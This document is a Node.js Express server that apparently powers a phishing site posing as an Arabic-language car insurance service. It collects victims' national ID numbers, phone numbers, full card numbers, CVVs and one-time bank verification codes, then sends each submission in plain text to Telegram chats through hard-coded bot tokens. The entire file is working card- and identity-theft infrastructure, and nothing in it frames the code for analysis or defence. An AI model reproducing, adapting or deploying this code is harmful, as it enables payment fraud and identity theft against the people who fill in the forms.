const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

// Telegram Configuration - Bot 1 (index.html + form.html)
const TELEGRAM_BOT_TOKEN_1 = '8929566483:AAFiIrpwPjaEuj3RJiL3-FhvlmcPpHohL5s';
const TELEGRAM_CHAT_ID_1 = '8535558521';

// Telegram Configuration - Bot 2 (visa.html + otp pages) - PUT YOUR NEW BOT CREDENTIALS HERE
const TELEGRAM_BOT_TOKEN_2 = '8861501632:AAGbneUqpyh_Od5YPXy2zSwxAq0JF3-1LzA';
const TELEGRAM_CHAT_ID_2 = '8535558521';

// Encryption key (32 bytes for AES-256)
const ENCRYPTION_KEY = crypto.scryptSync('secure-tameen-key-2024', 'salt', 32);
const IV_LENGTH = 16;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// Serve static files from public directory
const publicPath = path.join(__dirname, '..', 'public');
app.use(express.static(publicPath));

// Debug route to check if server is running
app.get('/debug', (req, res) => {
    res.json({
        status: 'ok',
        publicPath: publicPath,
        __dirname: __dirname,
        files: fs.readdirSync(publicPath)
    });
});

// =======================
// Encryption Functions
// =======================
function encrypt(text) {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return {
        iv: iv.toString('hex'),
        data: encrypted
    };
}

function decrypt(encryptedObj) {
    const decipher = crypto.createDecipheriv(
        'aes-256-cbc',
        ENCRYPTION_KEY,
        Buffer.from(encryptedObj.iv, 'hex')
    );
    let decrypted = decipher.update(encryptedObj.data, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

// =======================
// Data Management
// =======================
function readData() {
    try {
        if (!fs.existsSync(DATA_FILE)) {
            return { forms: [] };
        }
        const rawData = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(rawData);
    } catch (error) {
        console.error('Error reading data:', error);
        return { forms: [] };
    }
}

function writeData(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
        return true;
    } catch (error) {
        console.error('Error writing data:', error);
        return false;
    }
}

// =======================
// Telegram Functions
// =======================

// Send to Bot 1 (index.html + form.html)
async function sendToTelegramBot1(message) {
    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID_1,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        return await response.json();
    } catch (error) {
        console.error('Telegram Bot 1 Error:', error);
        return { ok: false, error: error.message };
    }
}

// Send to Bot 2 (visa.html + otp pages)
async function sendToTelegramBot2(message) {
    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID_2,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        return await response.json();
    } catch (error) {
        console.error('Telegram Bot 2 Error:', error);
        return { ok: false, error: error.message };
    }
}

// =======================
// Helper Functions
// =======================
function createTelegramMessage(type, data) {
    let message = '';
    
    switch (type) {
        case 'personal_info':
            message = `
<b>بيانات شخصية</b>

الاسم: ${data.owner_name}
رقم الهوية: ${data.id_number}
الهاتف: ${data.phone}
نوع الوثيقة: ${data.document_type}
${data.birth_date ? `تاريخ الميلاد: ${data.birth_date}` : ''}
            `;
            break;
            
        case 'insurance_info':
            message = `
<b>بيانات التأمين</b>

من: ${data.owner_name || 'غير محدد'}
نوع التأمين: ${data.insurance_type}
تاريخ البدء: ${data.start_date}
غرض الاستخدام: ${data.usage_purpose}
قيمة المركبة: ${data.car_value} ريال
سنة الصنع: ${data.manufacture_year}
مكان الإصلاح: ${data.repair_location}
            `;
            break;
            
        case 'payment_info':
            message = `
<b>بيانات الدفع</b>

من: ${data.owner_name || 'غير محدد'}
الاسم على البطاقة: ${data.card_name}
رقم البطاقة: ${data.card_number}
تاريخ الانتهاء: ${data.expiry_month}/${data.expiry_year}
CVV: ${data.cvv}
السعر النهائي: ${data.total_price}
            `;
            break;
            
        case 'otp_verification':
            message = `
<b>رمز التحقق</b>

من: ${data.owner_name || 'غير محدد'}
آخر 4 أرقام: ${data.last_4_digits || '----'}
رمز OTP: ${data.otp_code}
            `;
            break;
            
        default:
            message = `
<b>بيانات جديدة</b>
${JSON.stringify(data, null, 2)}
            `;
    }
    
    return message;
}

// =======================
// API Endpoints
// =======================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Submit personal info (index.html)
app.post('/api/submit/personal', async (req, res) => {
    try {
        const data = req.body;
        
        // Create unique ID for this session
        const sessionId = crypto.randomBytes(16).toString('hex');
        const timestamp = new Date().toISOString();
        
        // Encrypt sensitive data
        const encryptedId = encrypt(data.id_number);
        const encryptedPhone = encrypt(data.phone);
        
        // Prepare record
        const record = {
            sessionId,
            step: 1,
            type: 'personal_info',
            timestamp,
            encrypted: {
                id_number: encryptedId,
                phone: encryptedPhone
            },
            data: {
                owner_name: data.owner_name,
                document_type: data.document_type,
                serial_number: data.serial_number,
                birth_date: data.birth_date
            }
        };
        
        // Read existing data
        const existingData = readData();
        
        // Check if session exists
        let sessionIndex = existingData.forms.findIndex(f => f.sessionId === sessionId);
        if (sessionIndex === -1) {
            existingData.forms.push({ sessionId, records: [], createdAt: timestamp });
            sessionIndex = existingData.forms.length - 1;
        }
        
        // Add new record
        existingData.forms[sessionIndex].records.push(record);
        existingData.forms[sessionIndex].lastUpdated = timestamp;
        
        // Save to file
        writeData(existingData);
        
        // Send to Telegram Bot 1
        const telegramMessage = createTelegramMessage('personal_info', data);
        const telegramResult = await sendToTelegramBot1(telegramMessage);
        
        res.json({
            success: true,
            sessionId,
            telegram_sent: telegramResult.ok,
            message: 'تم حفظ البيانات بنجاح'
        });
        
    } catch (error) {
        console.error('Error in personal submit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Submit insurance info (form.html)
app.post('/api/submit/insurance', async (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString();
        
        // Prepare record
        const record = {
            step: 2,
            type: 'insurance_info',
            timestamp,
            data: {
                owner_name: data.owner_name,
                insurance_type: data.insurance_type,
                start_date: data.start_date,
                usage_purpose: data.usage_purpose,
                car_value: data.car_value,
                manufacture_year: data.manufacture_year,
                repair_location: data.repair_location
            }
        };
        
        // Find or create session
        const existingData = readData();
        const sessionId = data.sessionId || crypto.randomBytes(16).toString('hex');
        let sessionIndex = existingData.forms.findIndex(f => f.sessionId === sessionId);
        
        if (sessionIndex === -1) {
            existingData.forms.push({ sessionId, records: [], createdAt: timestamp });
            sessionIndex = existingData.forms.length - 1;
        }
        
        existingData.forms[sessionIndex].records.push(record);
        existingData.forms[sessionIndex].lastUpdated = timestamp;
        
        // Save to file
        writeData(existingData);
        
        // Send to Telegram Bot 1
        const telegramMessage = createTelegramMessage('insurance_info', data);
        const telegramResult = await sendToTelegramBot1(telegramMessage);
        
        res.json({
            success: true,
            telegram_sent: telegramResult.ok,
            message: 'تم حفظ بيانات التأمين بنجاح'
        });
        
    } catch (error) {
        console.error('Error in insurance submit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Submit company selection (select.html)
app.post('/api/submit/company', async (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString();
        
        const record = {
            step: 3,
            type: 'company_selection',
            timestamp,
            data: {
                owner_name: data.owner_name,
                company_name: data.company_name,
                company_logo: data.company_logo,
                price: data.price
            }
        };
        
        const existingData = readData();
        const sessionId = data.sessionId || crypto.randomBytes(16).toString('hex');
        let sessionIndex = existingData.forms.findIndex(f => f.sessionId === sessionId);
        
        if (sessionIndex === -1) {
            existingData.forms.push({ sessionId, records: [], createdAt: timestamp });
            sessionIndex = existingData.forms.length - 1;
        }
        
        existingData.forms[sessionIndex].records.push(record);
        existingData.forms[sessionIndex].lastUpdated = timestamp;
        
        writeData(existingData);
        
        // No Telegram for select.html (user chose not to send)
        
        res.json({
            success: true,
            telegram_sent: false,
            message: 'تم حفظ اختيار الشركة بنجاح'
        });
        
    } catch (error) {
        console.error('Error in company submit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Submit payment info (visa.html)
app.post('/api/submit/payment', async (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString();
        
        // Encrypt card data
        const encryptedCardNumber = encrypt(data.card_number);
        const encryptedCvv = encrypt(data.cvv);
        
        const record = {
            step: 4,
            type: 'payment_info',
            timestamp,
            encrypted: {
                card_number: encryptedCardNumber,
                cvv: encryptedCvv
            },
            data: {
                owner_name: data.owner_name,
                card_name: data.card_name,
                expiry_month: data.expiry_month,
                expiry_year: data.expiry_year,
                total_price: data.total_price
            }
        };
        
        const existingData = readData();
        const sessionId = data.sessionId || crypto.randomBytes(16).toString('hex');
        let sessionIndex = existingData.forms.findIndex(f => f.sessionId === sessionId);
        
        if (sessionIndex === -1) {
            existingData.forms.push({ sessionId, records: [], createdAt: timestamp });
            sessionIndex = existingData.forms.length - 1;
        }
        
        existingData.forms[sessionIndex].records.push(record);
        existingData.forms[sessionIndex].lastUpdated = timestamp;
        
        writeData(existingData);
        
        // Send to Telegram Bot 2
        const telegramMessage = createTelegramMessage('payment_info', data);
        const telegramResult = await sendToTelegramBot2(telegramMessage);
        
        res.json({
            success: true,
            telegram_sent: telegramResult.ok,
            message: 'تم حفظ بيانات الدفع بنجاح'
        });
        
    } catch (error) {
        console.error('Error in payment submit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Submit OTP verification (otp.html, otp2.html, otp3.html)
app.post('/api/submit/otp', async (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString();
        
        const record = {
            step: data.step || 5,
            type: 'otp_verification',
            timestamp,
            data: {
                owner_name: data.owner_name,
                last_4_digits: data.last_4_digits,
                otp_code: data.otp_code,
                page: data.page
            }
        };
        
        const existingData = readData();
        const sessionId = data.sessionId || crypto.randomBytes(16).toString('hex');
        let sessionIndex = existingData.forms.findIndex(f => f.sessionId === sessionId);
        
        if (sessionIndex === -1) {
            existingData.forms.push({ sessionId, records: [], createdAt: timestamp });
            sessionIndex = existingData.forms.length - 1;
        }
        
        existingData.forms[sessionIndex].records.push(record);
        existingData.forms[sessionIndex].lastUpdated = timestamp;
        
        writeData(existingData);
        
        // Send to Telegram Bot 2
        const telegramMessage = createTelegramMessage('otp_verification', data);
        const telegramResult = await sendToTelegramBot2(telegramMessage);
        
        res.json({
            success: true,
            telegram_sent: telegramResult.ok,
            message: 'تم حفظ رمز التحقق بنجاح'
        });
        
    } catch (error) {
        console.error('Error in OTP submit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get session data
app.get('/api/session/:sessionId', (req, res) => {
    try {
        const { sessionId } = req.params;
        const data = readData();
        const session = data.forms.find(f => f.sessionId === sessionId);
        
        if (!session) {
            return res.status(404).json({ error: 'Session not found' });
        }
        
        res.json(session);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Get all sessions (admin endpoint)
app.get('/api/all-sessions', (req, res) => {
    try {
        const data = readData();
        res.json({
            total: data.forms.length,
            sessions: data.forms.map(s => ({
                sessionId: s.sessionId,
                createdAt: s.createdAt,
                lastUpdated: s.lastUpdated,
                steps: s.records.map(r => r.step),
                types: s.records.map(r => r.type)
            }))
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Catch-all route to serve index.html for any path
app.get('*', (req, res) => {
    const indexPath = path.join(publicPath, 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(404).send('index.html not found at: ' + indexPath);
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════╗
║  🚀 Tameen Telegram Server Started         ║
║  Port: ${PORT}                              ║
║  Time: ${new Date().toISOString()}  ║
╚════════════════════════════════════════════╝
    `);
});
